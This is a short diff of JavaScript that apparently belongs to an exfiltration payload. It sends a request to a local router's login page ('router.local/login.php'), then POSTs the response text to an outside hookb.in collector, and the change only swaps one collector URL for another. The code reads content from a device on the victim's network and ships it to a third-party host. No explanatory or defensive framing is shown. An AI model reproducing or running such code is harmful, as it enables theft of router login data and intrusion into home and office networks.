@@ -5,7 +5,7 @@ http.open('POST', 'http://router.local/login.php', true);
 http.onload = function () {
     if (http.readyState === http.DONE) {
         const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://hookb.in/qB0gRL1bWWCEwPllaGmx', true);
+        xhr.open('POST', 'https://hookb.in/JKaz3waakMcg0l99GB0Y', true);
         xhr.setRequestHeader('Content-type', 'application/json');
         xhr.send(JSON.stringify(http.responseText));
         
